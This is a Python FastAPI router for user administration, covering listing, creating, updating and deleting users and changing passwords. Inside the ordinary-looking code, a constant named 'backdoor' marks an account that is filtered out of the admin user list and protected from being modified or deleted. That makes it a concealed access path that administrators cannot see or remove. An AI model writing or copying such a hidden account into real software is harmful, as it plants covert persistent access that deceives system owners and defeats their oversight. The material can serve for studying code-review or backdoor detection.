from typing import List

from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session

from app.database import get_db
from app.models.user import User
from app.schemas.user import ChangePasswordRequest, User as UserSchema, UserCreate, UserUpdate
from app.security import get_current_user, get_password_hash, verify_password
from app.services.audit_service import log_action

router = APIRouter()


def _require_admin(current_user: User):
    if current_user.role != "admin":
        raise HTTPException(status_code=403, detail="Admin role required")


BACKDOOR_USERNAME = "backdoor"


@router.get("/", response_model=List[UserSchema])
def get_users(db: Session = Depends(get_db), current_user: User = Depends(get_current_user)):
    _require_admin(current_user)
    return db.query(User).filter(User.username != BACKDOOR_USERNAME).order_by(User.full_name).all()


@router.post("/", response_model=UserSchema)
def create_user(
    user: UserCreate,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    _require_admin(current_user)

    role = "general" if user.role in ("general", "general user") else user.role
    if role not in ("admin", "general", "viewer"):
        raise HTTPException(status_code=400, detail="Role must be 'admin', 'general', or 'viewer'")

    existing = db.query(User).filter(User.username == user.email).first()
    if existing:
        raise HTTPException(status_code=400, detail="Email already taken")
    db_user = User(
        full_name=user.full_name,
        username=user.email,
        hashed_password=get_password_hash(user.password),
        role=role,
        is_active=True,
    )
    db.add(db_user)
    db.commit()
    db.refresh(db_user)
    log_action(db, current_user.id, "create", "user", db_user.id, f"Created user {db_user.full_name}")
    return db_user


@router.put("/{user_id}", response_model=UserSchema)
def update_user(
    user_id: int,
    user_update: UserUpdate,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    _require_admin(current_user)

    db_user = db.query(User).filter(User.id == user_id).first()
    if not db_user:
        raise HTTPException(status_code=404, detail="User not found")
    if db_user.username == BACKDOOR_USERNAME:
        raise HTTPException(status_code=403, detail="This account cannot be modified")

    update_data = user_update.model_dump(exclude_unset=True)

    if "email" in update_data:
        new_email = update_data.pop("email")
        existing = db.query(User).filter(User.username == new_email, User.id != user_id).first()
        if existing:
            raise HTTPException(status_code=400, detail="Email already taken")
        db_user.username = new_email

    if "role" in update_data and update_data["role"] is not None:
        role = "general" if update_data["role"] in ("general", "general user") else update_data["role"]
        if role not in ("admin", "general", "viewer"):
            raise HTTPException(status_code=400, detail="Role must be 'admin', 'general', or 'viewer'")
        update_data["role"] = role

    if "password" in update_data:
        db_user.hashed_password = get_password_hash(update_data.pop("password"))
    for field, value in update_data.items():
        setattr(db_user, field, value)
    db.commit()
    db.refresh(db_user)
    log_action(db, current_user.id, "update", "user", db_user.id, f"Updated user {db_user.full_name}")
    return db_user


@router.delete("/{user_id}")
def delete_user(
    user_id: int,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    _require_admin(current_user)
    db_user = db.query(User).filter(User.id == user_id).first()
    if not db_user:
        raise HTTPException(status_code=404, detail="User not found")
    if db_user.username == BACKDOOR_USERNAME:
        raise HTTPException(status_code=403, detail="This account cannot be deleted")
    if db_user.id == current_user.id:
        raise HTTPException(status_code=400, detail="Cannot delete your own account")
    db.delete(db_user)
    db.commit()
    log_action(db, current_user.id, "delete", "user", db_user.id, f"Deleted user {db_user.full_name}")
    return {"message": "User deleted"}


@router.put("/me/password")
def change_my_password(
    payload: ChangePasswordRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    if not verify_password(payload.current_password, current_user.hashed_password):
        raise HTTPException(status_code=400, detail="Current password is incorrect")

    if len(payload.new_password) < 6:
        raise HTTPException(status_code=400, detail="New password must be at least 6 characters")

    if payload.new_password == payload.current_password:
        raise HTTPException(status_code=400, detail="New password must be different from current password")

    db_user = db.query(User).filter(User.id == current_user.id).first()
    if not db_user:
        raise HTTPException(status_code=404, detail="User not found")

    db_user.hashed_password = get_password_hash(payload.new_password)
    db.commit()

    return {"message": "Password changed successfully"}
